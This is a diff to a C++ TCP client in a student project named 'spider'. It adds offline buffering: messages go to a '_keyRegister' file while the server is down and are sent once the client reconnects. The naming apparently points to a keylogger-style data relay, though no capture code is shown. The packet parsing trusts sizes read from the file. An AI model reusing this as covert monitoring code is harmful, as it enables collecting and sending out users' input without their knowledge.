@@ -5,7 +5,7 @@
 // Login   <gandoulf@epitech.net>
 //
 // Started on  Wed Nov  9 15:32:04 2016 Gandoulf
-// Last update Sun Nov 13 22:27:41 2016 Gandoulf
+// Last update Mon Nov 14 15:15:45 2016 Gandoulf
 //
 
 #include <cstdlib>
@@ -41,11 +41,14 @@ namespace spider
 			      });
       _client.OnStart([this](Socket::Client &client, std::string const &address, int port)
 		      {
+			_keyRegister.swapMode();
 			std::cout << "connection" << std::endl;
 		      });
       _client.OnDisconnect([this](Socket::Client &client)
 			   {
 			     std::cout << "disonnection" << std::endl;
+			     _runningService = false;
+			     _keyRegister.swapMode();
 			     _Mqueue.lock();
 			     for (auto ite = _messages.begin(); ite != _messages.end(); ++ite)
 			       delete[] *ite;
@@ -62,12 +65,12 @@ namespace spider
 	    {
 	      delete[] tmp;
 	      _rdQ.pop();
-	    }
+	      }
 
 	  for (auto it = _messages.begin(); it != _messages.end(); ++it)
 	    {
 	      delete[] * it;
-	    }*/
+	      }*/
 	}
 
     void ClientTcpSocket::close()
@@ -93,7 +96,16 @@ namespace spider
 	  _messagesSize.push_back(17);
 	  _runningService = true;
 	  std::cout << "starting client" << std::endl;
-	  _client.start(_adresse, _port);
+	  try {
+	    _client.start(_adresse, _port);
+	  }
+	  catch (const std::exception e) {
+	    std::cout << "server not connected" << std::endl;
+	    delete[] _messages.back();
+	    _messages.pop_back();
+	    _messagesSize.pop_back();
+	    _runningService = false;
+	  }
 	}
       else
 	std::cout << "service already started" << std ::endl;
@@ -164,25 +176,47 @@ namespace spider
 	    std::cout << std::hex << (int)(_messages.front()[i]);
 	  }
 	  std::cout << std::dec << std::endl;*/
-	  if (_runningService)
-	    _client.write(_messages.front(), _messagesSize.front());
+	  char *bufferFile;
+	  int bufferSize;
+	  if (_messages.size() < 10000 && (bufferSize = _keyRegister.read(bufferFile)) > 0)
+	    {
+	      pushFileCMD(bufferFile, bufferSize);
+	      delete[] bufferFile;
+	    }
 	  else
-	    _keyRegister.write(_messages.front(), _messagesSize.front());
-	  delete[] _messages.front();
-	  _messages.pop_front();
-	  _messagesSize.pop_front();
+	    {
+	      _client.write(_messages.front(), _messagesSize.front());
+	      delete[] _messages.front();
+	      _messages.pop_front();
+	      _messagesSize.pop_front();
+	    }
 	}
       _Mqueue.unlock();
     }
 
-	std::mutex *ClientTcpSocket::getQMtx()
+    void ClientTcpSocket::pushFileCMD(char *bufferFile, int bufferSize)
+    {
+      PackageHeader	package;
+      char		*msg;
+      for(int i = 0; i < bufferSize;)
 	{
-		return &_mtxQ;
+	  package = *(static_cast<PackageHeader *>(static_cast<void *>(bufferFile + i)));
+	  msg = new char[package.size];
+	  std::memcpy(msg, bufferFile + i, package.size);
+	  _messages.push_back(msg);
+	  _messagesSize.push_back(package.size);
+	  i += package.size;
 	}
+    }
 
-	std::queue<char *>& ClientTcpSocket::getRdQ()
-	{
-		return _rdQ;
-	}
+    std::mutex *ClientTcpSocket::getQMtx()
+    {
+      return &_mtxQ;
+    }
+
+    std::queue<char *>& ClientTcpSocket::getRdQ()
+    {
+      return _rdQ;
+    }
   }
 }
